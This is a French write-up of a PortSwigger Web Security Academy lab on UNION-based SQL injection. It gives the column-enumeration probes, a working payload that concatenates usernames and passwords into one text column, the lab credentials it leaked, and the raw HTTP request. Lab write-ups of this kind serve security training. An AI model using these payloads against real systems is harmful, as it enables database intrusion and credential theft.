# 💉 Lab : SQL injection UNION attack, retrieving multiple values in a single column
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi (Data Exfiltration via Concaténation)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
Une vulnérabilité d'injection SQL de type UNION est présente dans le filtre de catégorie. Contrairement au cas idéal, la requête originelle ne contenait qu'une seule colonne compatible avec du texte. Pour extraire plusieurs informations (identifiant ET mot de passe) simultanément, il a fallu utiliser la fonction de concaténation de la base de données.

## 🛠️ Preuve de Concept (PoC)
1. **Énumération de la structure :**
   Les tests préliminaires (`UNION SELECT NULL,NULL--`) ont révélé que la requête SQL attend **2 colonnes**.
   Les tests de type (`UNION SELECT NULL,'a'--`) ont prouvé que **seule la 2ème colonne** accepte des chaînes de caractères (strings).

2. **Exploitation et Concaténation :**
   Pour extraire la table `users`, les champs `username` et `password` ont été fusionnés dans l'unique colonne de texte disponible, séparés par le caractère `~` pour faciliter la lecture.
   
   - **Payload :** `category=Lifestyle' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--`

3. **Résultat (Data Breach) :**
   L'injection a permis de faire fuiter les accès de tous les utilisateurs directement dans la liste des produits :
   - `wiener` : `upiz6v4989bt7mdpd76l`
   - `carlos` : `o2hszp6xkpekclv4100l`
   - `administrator` : `d1bon2ip9ip0utm03lb2`

```http
GET /filter?category=Lifestyle'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users-- HTTP/2
Host: 0a5f000c0348c1f780dc308a007a0074.web-security-academy.net